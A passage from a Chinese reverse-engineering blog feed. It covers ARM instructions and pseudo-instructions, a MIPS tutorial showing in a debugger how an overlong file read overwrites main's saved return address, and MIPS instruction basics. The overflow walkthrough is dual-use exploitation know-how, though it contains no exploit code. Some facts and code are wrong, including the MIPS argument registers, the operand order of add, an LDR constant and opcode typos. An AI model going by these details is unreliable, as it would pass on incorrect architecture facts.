id="LDC-协处理器数据读取指令"><a href="#LDC-协处理器数据读取指令" class="headerlink" title="LDC  协处理器数据读取指令"></a>LDC  协处理器数据读取指令</h4><blockquote><p>LDC{cond}{L} coproc,CRd,&lt;地址&gt;</p><p>L 可选后缀，指明是长整数传送。</p><p>coproc 指令操作的协处理器名。标准名为pn，n 为0～15</p><p>CRd 作为目标寄存的协处理器寄存器。</p><p>&lt;地址&gt; 指定的内存地址</p></blockquote><p>LDC指令从某一连续的内存单元将数据读取到协处理器的寄存器中。协处理器数据的数据的传送，由协处理器来控传送的字数。若协处理器不能成功地执行该操作，将产生未定义指令异常中断</p><blockquote><p>LDC p5,c2,[R2,#4];读取R2+4指向的内存单元的数据，传送到协处理器p5的c2寄存器中</p><p>LDC p6,c2,[R1] ;读取是指向的内存单元的数据，传送到协处理器p6的c2 寄存器中</p></blockquote><h4 id="STC-协处理器数据写入指令"><a href="#STC-协处理器数据写入指令" class="headerlink" title="STC 协处理器数据写入指令"></a>STC 协处理器数据写入指令</h4><blockquote><p>STC{cond}{L} coproc,CRd,&lt;地址&gt;</p><p>L 可选后缀，指明是长整数传送。</p><p>coproc 指令操作的协处理器名。标准名为pn，n 为0～15</p><p>CRd 作为目标寄存的协处理器寄存器。</p><p>&lt;地址&gt; 指定的内存地址</p></blockquote><p>STC指令将协处理器的寄存器数据写入到某一连续的内存单元中。进行协处理器数据的数据传送，由协处理器来控制传送的字数。若协处理器不能成功地执行该操作，将产生未定义指令异常中断</p><blockquote><p>STC p5,c1,[R0]</p><p>STC p5,c1,[Ro,#-0x04]</p></blockquote><h4 id="MCR-ARM寄存器到协处理器寄存器的数据传送指令"><a href="#MCR-ARM寄存器到协处理器寄存器的数据传送指令" class="headerlink" title="MCR ARM寄存器到协处理器寄存器的数据传送指令"></a>MCR ARM寄存器到协处理器寄存器的数据传送指令</h4><blockquote><p>MCR{cond}coproc,opcodel,Rd,CRn,CRm{,opcode2}</p><p>coproc 指令操作的协处理器名。标准名为pn，n 为0～15。</p><p>cpcodel 协处理器的特定操作码。</p><p>RD 作为目标寄存器。</p><p>CRn 存放第1 个操作数的协处理器寄存器</p><p>CRm 存放第2 个操作数的协处理器寄存器。</p><p>Opcode2 可选的协处理器特定操作码。</p></blockquote><p>MCR 指令将ARM 处理器的寄存器中的数据传送到协处理器的寄存器中。若协处理器不能成功地执行该操作，将产生未定义指令异常中断</p><blockquote><p>MCR p6,2,R7,c1,c2,</p><p>MCR P7,0,R1,c3,c2,1,</p></blockquote><h4 id="MRC-协处理器寄存器到ARM寄存器到的数据传送指令"><a href="#MRC-协处理器寄存器到ARM寄存器到的数据传送指令" class="headerlink" title="MRC 协处理器寄存器到ARM寄存器到的数据传送指令"></a>MRC 协处理器寄存器到ARM寄存器到的数据传送指令</h4><blockquote><p>MRC {cond}coproc,opcodel,Rd,CRn,CRm{,opcode2}</p><p>coproc 指令操作的协处理器名。标准名为pn，n为0～15。</p><p>opcodel 协处理器的特定操作码。</p><p>Rd 作为目标寄存器。</p><p>CRn 存放第1 个操作数的协处理器寄存器。</p><p>CRm 存放第2 个操作数的协处理器寄存器。</p><p>opcode2 可选的协处理器特定操作码。</p></blockquote><p>MRC 指令将协处理器寄存器中的数据传送到ARM 处理器的寄存器中。若协处理器不能成功地执行该操作。将产生未定义异常中断</p><blockquote><p>MRC p5,2,R2,c3,c2</p><p>MRC p7,0,R0,c1,c2,1</p></blockquote><h3 id="ARM-杂项指令"><a href="#ARM-杂项指令" class="headerlink" title="ARM 杂项指令"></a>ARM 杂项指令</h3><h4 id="SWI-软中断指令"><a href="#SWI-软中断指令" class="headerlink" title="SWI 软中断指令"></a>SWI 软中断指令</h4><blockquote><p>SWI{cond} immed_24</p><p>immed_24 24 位立即数，值为0～16777215 之间的整数。</p></blockquote><p>SWI 指令用于产生软中断，从而实现在用户模式变换到管理模式，CPSR保存到管理模式的SPSR中，执行转移到SWI 向量，在其它模式下也可使用SWI 指令，处理同样地切换到管理模式</p><blockquote><p>SWI 0 ;软中断，中断立即数为0</p><p>SWI 0x123456 ;软中断，中断立即数为0x123456</p></blockquote><div class="code-wrapper"><pre><code class="hljs armasm">使用<span class="hljs-keyword">SWI</span> 指令时，通常使用以下两种方法进行传递参数，<span class="hljs-keyword">SWI</span> 异常中断处理程序就可以提供相关的服务，这两种方法均是用户软件协定。SWI异常中断处理程序要通过读取引起软中断的<span class="hljs-keyword">SWI</span> 指令，以取得<span class="hljs-number">24</span> 位立即数。    （A）指令<span class="hljs-number">24</span> 位的立即数指定了用户请求的服务类型，参数通过用寄存器传递。    <span class="hljs-keyword">MOV</span> <span class="hljs-built_in">R0</span>,<span class="hljs-number">#34</span>   <span class="hljs-comment">;设置了功能号为34</span>    <span class="hljs-keyword">SWI</span> <span class="hljs-number">12</span>     <span class="hljs-comment">;调用12 号软中断</span>    （B）指令中的<span class="hljs-number">24</span> 位立即数被忽略，用户请求的服务类型由寄存器<span class="hljs-built_in">R0</span> 的值决定，参数通过其它的通用寄存器传递。    <span class="hljs-keyword">MOV</span> <span class="hljs-built_in">R0</span>,<span class="hljs-number">#12</span>   <span class="hljs-comment">;调用12 号软中断</span>    <span class="hljs-keyword">MOV</span> <span class="hljs-built_in">R1</span>,<span class="hljs-number">#34</span>   <span class="hljs-comment">;设置子功能号为34</span>    <span class="hljs-keyword">SWI</span> <span class="hljs-number">0</span>    <span class="hljs-comment">;</span>在<span class="hljs-keyword">SWI</span> 异常中断处理程序中，取出<span class="hljs-keyword">SWI</span> 立即数的步骤为：首先确定引起软中断的SWI指令是<span class="hljs-meta">ARM</span>指令还时<span class="hljs-meta">Thumb</span> 指令，这可通过对SPSR 访问得到：然后要取得该<span class="hljs-keyword">SWI</span> 指令的地址，这可通过访问<span class="hljs-built_in">LR</span> 寄存器得到：接着读出指令，分解出立即数。    读出<span class="hljs-keyword">SWI</span> 立即数：    T_bit <span class="hljs-meta">EQU</span> <span class="hljs-number">0x20</span>    SWI_Hander    STMFD <span class="hljs-built_in">SP</span>!,&#123;R0_R3,<span class="hljs-built_in">R12</span>,<span class="hljs-built_in">LR</span>&#125;    <span class="hljs-comment">;现场保护</span>    <span class="hljs-keyword">MRS</span> <span class="hljs-built_in">R0</span>,SPSR           <span class="hljs-comment">;读取SPSR</span>    STMFD <span class="hljs-built_in">SP</span>!,&#123;<span class="hljs-built_in">R0</span>&#125;           <span class="hljs-comment">;保存SPSR</span>    <span class="hljs-keyword">TST</span> <span class="hljs-built_in">R0</span>,<span class="hljs-symbol">#T_bit</span>           <span class="hljs-comment">;测试T标志位</span>    LDRNEH <span class="hljs-built_in">R0</span>,[<span class="hljs-built_in">LR</span>,#-<span class="hljs-number">2</span>]        <span class="hljs-comment">;若是Thumb指令，读取指令码(16 位)</span>    <span class="hljs-keyword">BICNE</span> <span class="hljs-built_in">R0</span>,<span class="hljs-built_in">R0</span>,<span class="hljs-number">#0xFF00</span>      <span class="hljs-comment">;取得Thumb 指令的8 位立即数</span>    <span class="hljs-keyword">LDREQ</span> <span class="hljs-built_in">R0</span>,[<span class="hljs-built_in">LR</span>,#-<span class="hljs-number">4</span>]         <span class="hljs-comment">;若是ARM 指令，读取指令码(32 位)</span>    BICNQ <span class="hljs-built_in">R0</span>,<span class="hljs-built_in">R0</span>,<span class="hljs-number">#0xFF00000</span>      <span class="hljs-comment">;取得ARM 指令的24 位立即数</span>    …    <span class="hljs-keyword">LDMFD</span> <span class="hljs-built_in">SP</span>!,&#123;<span class="hljs-built_in">R0</span>-<span class="hljs-built_in">R3</span>,<span class="hljs-built_in">R12</span>,<span class="hljs-built_in">PC</span>&#125;^ <span class="hljs-comment">;SWI 异常中断返回</span></code></pre></div><h3 id="MRS-读状态寄存器指令"><a href="#MRS-读状态寄存器指令" class="headerlink" title="MRS 读状态寄存器指令"></a>MRS 读状态寄存器指令</h3><blockquote><p>MRS{cond} Rd ,psr</p><p>Rd 目标寄存器。Rd 不允许为R15。</p><p>psr CPSR 或SPSR</p></blockquote><p>在ARM 处理器中，只有MRS 指令可以状态寄存器CPSR或SPSR读出到通用寄存器中</p><p>MRS 指令读取CPSR，可用来判断ALU 的状态标志，或IRQ、FIQ中断是否允许等；在异常处理程序中，读SPSR 可知道进行异常前的处理器状态等。MRS 与MSR 配合使用，实现CPSR 或SPSR 寄存器的读—修改—写操作，可用来进行处理器模式切换()，允许&#x2F;禁止IRQ&#x2F;FIQ中断等设置。另外，进程切换或允许异常中断嵌套时，也需要使用MRS 指令读取SPSR 状态值。保存起来</p><blockquote><p>MRS R1,CPSR   ;将CPSR状态寄存器读取，保存到R1 中</p><p>MRS R2,SPSR   ;将SPSR状态寄存器读取，保存到R2 中</p></blockquote><div class="code-wrapper"><pre><code class="hljs armasm">使能IRQ 中断例程：        ENABLE_IRQ        <span class="hljs-keyword">MRS</span> <span class="hljs-built_in">R0</span>,<span class="hljs-keyword">CPSR</span>        <span class="hljs-keyword">BIC</span> <span class="hljs-built_in">R0</span>。<span class="hljs-built_in">R0</span>,<span class="hljs-number">#0x80</span>        <span class="hljs-keyword">MSR</span> <span class="hljs-built_in">CPSR_c</span>,<span class="hljs-built_in">R0</span>        <span class="hljs-keyword">MOV</span> <span class="hljs-built_in">PC</span>,<span class="hljs-built_in">LR</span>禁能IRQ 中断例程：        DISABLE_IRQ        <span class="hljs-keyword">MRS</span> <span class="hljs-built_in">R0</span>,<span class="hljs-keyword">CPSR</span>        <span class="hljs-keyword">ORR</span> <span class="hljs-built_in">R0</span>,<span class="hljs-built_in">R0</span>,<span class="hljs-number">#0x80</span>        <span class="hljs-keyword">MSR</span> <span class="hljs-built_in">CPSR_c</span>,<span class="hljs-built_in">R0</span>        <span class="hljs-keyword">MOV</span> <span class="hljs-built_in">PC</span>,<span class="hljs-built_in">LR</span></code></pre></div><h4 id="MSR-写状态寄存器指令"><a href="#MSR-写状态寄存器指令" class="headerlink" title="MSR 写状态寄存器指令"></a>MSR 写状态寄存器指令</h4><blockquote><p>MSR{cond} psr_fields,#immed_8r</p><p>MSR{cond} psr_fields,Rm</p><p>其中： psr CPSR 或SPSR</p><p>fields 指定传送的区域。Fields 可以是以下的一种或多种(字母必须为小写)：</p><p>c 控制域屏蔽字节(psr[7…0])</p><p>x 扩展域屏蔽字节(psr[15…8])</p><p>s 状态域屏蔽字节(psr[23。…16])</p><p>f 标志域屏蔽字节(psr[31…24])</p><p>immed_8r 要传送到状态寄存器指定域的立即数，8 位。</p><p>Rm 要传送到状态寄存器指定域的数据的源寄存器。</p></blockquote><p>在ARM 处理器中。只有MSR 指令可以直接设置状态寄存器CPSR或SPSR</p><blockquote><p>MSR CPSR_c,#0xD3 ;CPSR[7…0]&#x3D;0xD3，即切换到管理模式。</p><p>MSR CPSR_cxsf,R3 ;CPSR&#x3D;R3</p></blockquote><p>只有在特权模式下才能修改状态寄存器。<br>程序中不能通过MSR 指令直接修改CPSR 中的T 控制位来实现ARM 状态&#x2F;Thumb状态的切换，必须使用BX 指令完成处理器状态的切换(因为BX 指令属转移指令，它会打断流水线状态，实现处理器状态切换)。MRS 与MSR 配合使用，实现CPSR或SPSR 寄存器的读-修改-写操作，可用来进行处理器模式切换、允许&#x2F;禁止IRQ&#x2F;FIQ 中断等设置。</p><div class="code-wrapper"><pre><code class="hljs armasm">堆栈指令实始化例程：        INITSTACK        <span class="hljs-keyword">MOV</span> <span class="hljs-built_in">R0</span>,<span class="hljs-built_in">LR</span> <span class="hljs-comment">;保存返回地址</span>    <span class="hljs-comment">;设置管理模式堆栈</span>        <span class="hljs-keyword">MSR</span> <span class="hljs-built_in">CPSR_c</span>,<span class="hljs-number">#0xD3</span>        <span class="hljs-keyword">LDR</span> <span class="hljs-built_in">SP</span>,StackSvc    <span class="hljs-comment">;设置中断模式堆栈</span>        <span class="hljs-keyword">MSR</span> <span class="hljs-built_in">CPSR_c</span>,<span class="hljs-number">#0xD2</span>        <span class="hljs-keyword">LDR</span> <span class="hljs-built_in">SP</span>,StackIrq</code></pre></div><h3 id="ARM-伪指令"><a href="#ARM-伪指令" class="headerlink" title="ARM 伪指令"></a>ARM 伪指令</h3><h4 id="ADR-小范围的地址读取伪指令"><a href="#ADR-小范围的地址读取伪指令" class="headerlink" title="ADR 小范围的地址读取伪指令"></a>ADR 小范围的地址读取伪指令</h4><blockquote><p>ADR{cond} register,exper</p><p>register 加载的目标寄存器。</p><p>exper 地址表达式。当地址值是非字地齐时，取值范围-255～255 字节之间；当地址是字对齐时，取值范围-1020～1020字节之间。 </p><p>对于基于PC 相对偏移的地址值时，给定范围是相对当前指令地址后两个字处(因为ARM7TDMI为三级流水线)。</p></blockquote><p>ADR 指令将基于PC 相对偏移的地址值读取到寄存器中。在汇编编译源程序时，ADR伪指令被编译器替换成一条合适的指令。通常，编译器用一条ADD 指令或SUB 指令来实现该ADR 伪指令的功能，若不能用一条指令实现，则产生错误，编译失败</p><blockquote><p>LOOP MOV R1, #0xF0</p><p>…</p><p>ADR R2, LOOP     ;将LOOP 的地址放入R2</p><p>ADR R3, LOOP+4</p><p>可以用ADR 加载地址，实现查表：</p><p>…</p><p>ADR R0,DISP_TAB   ;加载转换表地址</p><p>LDRB R1,[R0,R2]   ;使用R2作为参数，进行查表</p><p>…</p><p>DISP_TAB</p><p>DCB0Xc0,0xF9,0xA4,0xB0,0x99,0x92,0x82,0xF8,0x80,0x90</p></blockquote><h4 id="ADRL-中等范围的地址读取伪指令"><a href="#ADRL-中等范围的地址读取伪指令" class="headerlink" title="ADRL 中等范围的地址读取伪指令"></a>ADRL 中等范围的地址读取伪指令</h4><blockquote><p>ADR{cond} register,exper</p><p>register 加载的目标寄存器。</p><p>expr 地址表达式。当地址值是非字对齐时，取范围-64K～64K 字节之间；当地址值是字对齐时，取值范围-256K～256K字节之间。</p></blockquote><p>ADRL 指令将基于PC 相对偏移的地址值或基于寄存器相对偏移的地址值读取到寄存器中，比ADR伪指令可以读取更大范围的地址。在汇编编译源程序时，ADRL 伪指令被编译器替换成两个条合适的指令。若不能用两条指令实现ADRL 伪指令功能，则产生错误，编译失败</p><blockquote><p>ADRL R0,DATA_BUF</p><p>…</p><p>ADRL R1 DATA_BUF+80</p><p>…</p><p>DATA_BUF</p><p>SPACE 100   ;定义100 字节缓冲区</p><p>可以且用ADRL 加载地址，实现程序跳转，中等范围地址的加载：<br>…</p><p>ADR LR,RETURNI       ;设置返回地址</p><p>ADRL R1Thumb_Sub+1    ;取得了Thumb 子程序入口地址，且R1 的0 位置1</p><p>BX R1           ;调用Thumb子程序，并切换处理器状态</p><p>RETURNI</p><p>…</p><p>CODE16</p><p>Thumb_Sub</p><p>MOV R1,#10</p><p>…</p></blockquote><h4 id="LDR-大范围的地址读取伪指令"><a href="#LDR-大范围的地址读取伪指令" class="headerlink" title="LDR 大范围的地址读取伪指令"></a>LDR 大范围的地址读取伪指令</h4><blockquote><p>LDR{cond} register,&#x3D;expr&#x2F;label_expr</p><p>register 加载的目标寄存器</p><p>expr 32 位立即数。</p><p>label_expr 基于PC 的地址表达式或外部表达式。</p></blockquote><p>LDR 伪指令用于加载32 位的立即数或一个地址值到指定寄存器。在汇编编译源程序时，LDR伪指令被编译器替换成一条合适的指令。若加载的常数未超出MOV 或MVN 的范围，则使用MOV 或MVN 指令代替该LDR 伪指令，否则汇编器将常量放入字池，并使用一条程序相对偏移的LDR指令从文字池读出常量</p><blockquote><p>LDR R0,&#x3D;0x123456     ;加载32 位立即数0x12345678</p><p>LDR R0,&#x3D;DATA_BUF+60  ;加载DATA_BUF 地址+60</p><p>…</p><p>LTORG           ;声明文字池</p><p>伪指令LDR 常用于加载芯片外围功能部件的寄存器地址(32 位立即数)，以实现各种控制操作加载32位立即数：</p><p>…</p><p>LDR R0,&#x3D;IOPIN ;加载GPIO 寄存器IOPIN 的地址</p><p>LDR R1,[R0] ;读取IOPIN 寄存器的值</p><p>…</p><p>LDR R0,&#x3D;IOSET</p><p>LDR R1,&#x3D;0x00500500</p><p>STR R1,[R0] ;IOSET&#x3D;0x00500500</p><p>…</p><p>从PC 到文字池的偏移量必须小于4KB。与ARM 指令的LDR 相比，伪指令的LDR的参数有“&#x3D;”号</p></blockquote><h4 id="NOP-空操作伪指令"><a href="#NOP-空操作伪指令" class="headerlink" title="NOP  空操作伪指令"></a>NOP  空操作伪指令</h4><p>NOP 伪指令在汇编时将会被代替成ARM 中的空操作，比如可能为“MOV R0, R0”指令等</p><blockquote><p>使用就单NOP</p></blockquote><h3 id="ARM寻址"><a href="#ARM寻址" class="headerlink" title="ARM寻址"></a>ARM寻址</h3><h4 id="立即数寻址"><a href="#立即数寻址" class="headerlink" title="立即数寻址"></a>立即数寻址</h4><p>立即数前面有“#”号，并且如果是十六进制数则在“#”后添加“0x”或“&amp;”，二进制数“#”后面加“%”</p><h4 id="寄存器间接寻址"><a href="#寄存器间接寻址" class="headerlink" title="寄存器间接寻址"></a>寄存器间接寻址</h4><p>操作数的地址在寄存器中 </p><p>ADD R0，R1，[R2]</p><h4 id="基址变址寻址"><a href="#基址变址寻址" class="headerlink" title="基址变址寻址"></a>基址变址寻址</h4><p>将寄存器的内容与指令中给出的地址偏移量相加，从而得到一个操作数的有效地址</p><p>ADD R0，R1，[R2]</p><h4 id="多寄存器寻址"><a href="#多寄存器寻址" class="headerlink" title="多寄存器寻址"></a>多寄存器寻址</h4><p>一条指令可以完成多个寄存器值得传递，一条指令传送最多16个通用寄存器的值</p><p>LDMIA R0，{R1，R2，R3，R4}</p><h4 id="相对寻址"><a href="#相对寻址" class="headerlink" title="相对寻址"></a>相对寻址</h4><p>以程序计数器PC的值作为基地址，指令中的地址标号作为偏移量，将两者相加后得到的操作数的有效地址</p><p>例如：BL NEXT</p><h3 id="ARM堆栈的增长方式"><a href="#ARM堆栈的增长方式" class="headerlink" title="ARM堆栈的增长方式"></a>ARM堆栈的增长方式</h3><p>当堆栈指针指向最后压入堆栈的数据时，称为满堆栈(FullStack)</p><p>当堆栈指针指向最后压入堆栈的数据时，称为满堆栈(FullStack)</p><p>递增堆栈：向高地址方向生长</p><p>递减堆栈：向低地址方向生长</p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MIPS栈溢出原理</title>
    <link href="/article/bd2e4070.html"/>
    <url>/article/bd2e4070.html</url>
    
    <content type="html"><![CDATA[<h1 id="MIPS的函数调用"><a href="#MIPS的函数调用" class="headerlink" title="MIPS的函数调用"></a>MIPS的函数调用</h1><p>小知识：</p><blockquote><p>Mips 调用函数时不会将返回地址放入栈中，而在非叶子函数中，为了调用下一个函数，会将上一个函数的返回地址压栈</p><p>叶子函数，即该函数中不会调用任何其他函数</p><p>非叶子函数，即该函数需要调用其他函数</p></blockquote><p>mips的函数调用过程</p><p>当函数A执行到调用函数B的指令时，函数调用指令复制当前pc寄存器的值到ra寄存器中，即ra中存放返回地址</p><blockquote><p>他这个没有专门的控制ra的指令，在ja指令执行的时候，给ra赋值了</p></blockquote><p>程序跳转到函数B的时候，如果是非叶子函数，函数B会先把函数A的返回地址压栈（即ra寄存器的值压栈），叶子函数没有这个操作，返回地址就只存在于ra寄存器中</p><blockquote><p>main函数一般是一个非叶子函数，我们几乎可以在任何mian开头看到 <code>sw $ra,0x20+var_s4($sp)</code>这条指令</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141121629.png" alt="image-20220402141121629"></p><p>函数B执行完之后，叶子函数直接使用<code>jr $ra</code>指令返回函数A，而非叶子函数则需要，从堆栈中取出返回地址，然后将返回地址放入ra寄存器，再使用<code>jr $ra</code>指令</p><h2 id="下面是两个程序（叶子和非叶子）的分析"><a href="#下面是两个程序（叶子和非叶子）的分析" class="headerlink" title="下面是两个程序（叶子和非叶子）的分析"></a>下面是两个程序（叶子和非叶子）的分析</h2><h3 id="叶子函数"><a href="#叶子函数" class="headerlink" title="叶子函数"></a>叶子函数</h3><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141131544.png" alt="image-20220402141131544"></p><p>这个程序中，add函数为叶子函数，我们去分析add函数调用之前做了什么。</p><blockquote><p>这里使用<code>mipsel-linux-gnu-gcc -o tree tree.c -static</code>进行编译</p><p>然后使用<code>qemu-mipsel -g 1234 tree</code>与ida连用的动态调试</p><p>IDA remote另一篇文章会详细讲，这里就不赘述</p></blockquote><p>下断点到main函数，能看到在<code>400578</code>处有看到将ra压栈的操作，这个就是操作系统的某个地址。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141137056.png" alt="image-20220402141137056"></p><p>重点在<code>0040059c</code>这个行，调用add函数，先不关心参数调用，只看ra寄存器的相关操作</p><p>执行完00400578后，寄存器以及栈中的内容</p><p><img src="/../../../Library/Application%20Support/typora-user-images/image-20210825095723949.png" alt="image-20210825095723949"></p><p>继续执行至0040059c，此时ra值没有改变</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141148995.png" alt="image-20220402141148995"></p><p>执行jal add</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141156455.png" alt="image-20220402141156455"></p><p>跳转过来之后，ra的值变了，值正好是jr add的下一条可用指令（nop的目的只是为了对齐）</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141203617.png" alt="image-20220402141203617"></p><p>再看add的所有指令，会发现，只有跳回main函数指令出现了ra寄存器</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141210131.png" alt="image-20220402141210131"></p><h3 id="非叶子函数"><a href="#非叶子函数" class="headerlink" title="非叶子函数"></a>非叶子函数</h3><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141216124.png" alt="image-20220402141216124"></p><p>add中调用了printf()函数。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141223617.png" alt="image-20220402141223617"></p><p>执行进入add函数，与叶子函数相同</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141230705.png" alt="image-20220402141230705"></p><p>进入之后，抬高堆栈后，执行了ra压栈操作，即<code>00400544</code>这一行的操作</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141238248.png" alt="image-20220402141238248"></p><p>上图是函数执行完之后，准备返回main，在<code>0040059c</code>这行把main函数的返回地址放回ra。</p><p>然后通过<code>jr $ra</code>返回main。</p><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p>mips函数调用传递参数规则，前四个参数通过$a1- $a3寄存器传递，其他参数通过栈传递。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141246086.png" alt="image-20220402141246086"></p><p>从main函数中来看，先将参数数字放到临时栈中（蓝色框中），然后将第五个参数去取出，放入add的栈中，然后将前四个栈放到a0-a3寄存器中（红框）</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141304900.png" alt="image-20220402141304900"></p><p>我们来尝试画出其栈图，下图是main函数的栈图</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141314906.png" alt="image-20220402141314906"></p><p>红框为上个函数的返回地址，蓝框为局部变量，绿的是第五个参数。</p><h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><p>我们使用下面代码来做实验</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141342106.png" alt="image-20220402141342106"></p><p>代码大意就是从passwd这个文件读取文件。</p><p>尝试使用大量字符串</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141349030.png" alt="image-20220402141349030"></p><p>运行发现报错</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141355070.png" alt="image-20220402141355070"></p><p>栈溢出的目的是覆盖返回地址，上面说过，main一般是一个典型的非叶子函数，而且passwd文件的读取是在main中执行的，</p><p>所以我们目标应该在main刚进来的ra位置，使用ida+qemuGdb调试。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141401755.png" alt="image-20220402141401755"></p><p>运行至main</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141409333.png" alt="image-20220402141409333"></p><p>并且关注ra的值存放的位置，右键 -&gt; jump a new window</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141418631.png" alt="image-20220402141418631"></p><p>执行完ra压栈之后，栈中的数据</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141427263.png" alt="image-20220402141427263"></p><p>下面让程序读完passwd文件，这个地方有个小方法，读取一般是在循环中一个字符一个字符读的，所以向下单步执行，如果遇到多次循环，就可以尝试吧断点下载循环执行完的下一行。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141436143.png" alt="image-20220402141436143"></p><p>上图发现循环，尝试在循环外下断，不要断在nop上，情况允许就尽量断在nop下一行</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141447106.png" alt="image-20220402141447106"></p><p>ida下使用f9可以继续运行，直到下一个断点，运行到<code>00400500</code>后可以看到，地址存放的地方已经被覆盖</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141454519.png" alt="image-20220402141454519"></p><p>接下来可以使用cyclic等工具来计算长度，编写poc或exp利用。</p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>MIPS指令集</title>
    <link href="/article/6a1d16f9.html"/>
    <url>/article/6a1d16f9.html</url>
    
    <content type="html"><![CDATA[<h1 id="MIPS指令集"><a href="#MIPS指令集" class="headerlink" title="MIPS指令集"></a>MIPS指令集</h1><p>mips （risc 精简指令集）</p><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>mips 有32个寄存器，编号是从$0到$31</p><p>没有强制规则，但约定用法还是引入了一堆约定名</p><p>尽量使用约定名或者叫助记符</p><p>下面是寄存器用法（截的scdn [En Takahashi]老哥的），这些东西不一定要记，尽量还是用到多查，时间久了也就记住了</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141050555.png" alt="image-20220402141050555"></p><p>比较特殊的是</p><p>$0号寄存器，他里边放的只有0，又叫0号寄存器</p><p>$31号寄存器，里边放的是函数调用指令的返回地址</p><p>$1号寄存器，又叫at，由编译器生成的复合指令使用</p><blockquote><p>d</p></blockquote><p>v0,v1不够用的话用内存</p><p>hi和lo是两个跟乘法相关的寄存器，不是通用寄存器，所以不能用在其他地方</p><h2 id="寻址"><a href="#寻址" class="headerlink" title="寻址"></a>寻址</h2><p>寻址方式为地址 &#x3D; <code>基地址+偏移</code></p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>c中        long        int        short        char</p><p>mips    dword    word    halfword    byte</p><p>长度        8                4            2            1</p><h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>mips所有指令都是32位的</p><p>mips指令分为三种格式</p><ol><li>R-format 其他所有的</li><li>I-format 有立即数的指令</li><li>J-format 无条件跳转</li></ol><h3 id="R-format"><a href="#R-format" class="headerlink" title="R-format"></a>R-format</h3><p>对非立即数和跳转的操作</p><p>例如：add $8, $17, $18  &#x3D;》 $18 &#x3D; $8+$17 </p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141057353.png" alt="image-20220402141057353"></p><h3 id="I-format"><a href="#I-format" class="headerlink" title="I-format"></a>I-format</h3><p>数据放到寄存器，或者放入地址</p><p>分支（判断）指令</p><p>立即数运算</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141102389.png" alt="image-20220402141102389"></p><h3 id="J-format"><a href="#J-format" class="headerlink" title="J-format"></a>J-format</h3><p>跳转，类似于jump</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141108000.png" alt="image-20220402141108000"></p><h2 id="常用汇编指令"><a href="#常用汇编指令" class="headerlink" title="常用汇编指令"></a>常用汇编指令</h2><p>上边指令分类其实只是一个理解，详细的看下边</p><p><strong>lb &#x2F; lh &#x2F; lw</strong> :   从存储器中读取一个byte&#x2F;half word&#x2F;word的数据到寄存器中</p><p><strong>sb &#x2F; sh &#x2F;sw</strong>:    把一个byte&#x2F;half word&#x2F;word的数据从寄存器存储到存储器中</p><p><strong>mov &#x2F; movz &#x2F; movn</strong>:    复制，n为负，z为零。mov $1,$2; movz $1,$2,$3($3为零则复制$2到$1)</p><p><strong>addi&#x2F;addiu</strong>:   把一个寄存器的内容加上一个立即数;u为不带符号加。 rd &#x3D; rs + im</p><p><strong>sub&#x2F;subu</strong>：  把两个定点寄存器的内容相减。 rd &#x3D; rs - rt</p><p><strong>div&#x2F;divu</strong>:     两个定点寄存器的内容相除。 </p><p><strong>mul&#x2F;mulu</strong>:    两个定点寄存器的内容相乘。 </p><p><strong>slt&#x2F;slti&#x2F;sltui</strong>:  如果rs的值小于rt，那么设置rd的值为1,否则设置rd的值为0。 rd &#x3D; (rs &lt; rt) ? 1 : 0 ; rd &#x3D; (rs &lt; im) ? 1 : 0</p><p><strong>and&#x2F;andi:</strong>    与运算，两个寄存器中的内容相与 ;i为立即数。 rd &#x3D; rs &amp; rt ; rd &#x3D; rs &amp; im</p><p><strong>or&#x2F;ori</strong>:       或运算。 rd &#x3D; rs | rt ; rd &#x3D; rs | im</p><p><strong>xor&#x2F;xori</strong>:     异或运算。 rd &#x3D; rs ^ rt ;rd &#x3D; rs ^ im</p><p><strong>nor&#x2F;nori:</strong>     取反运算。 rd &#x3D; !(rs | 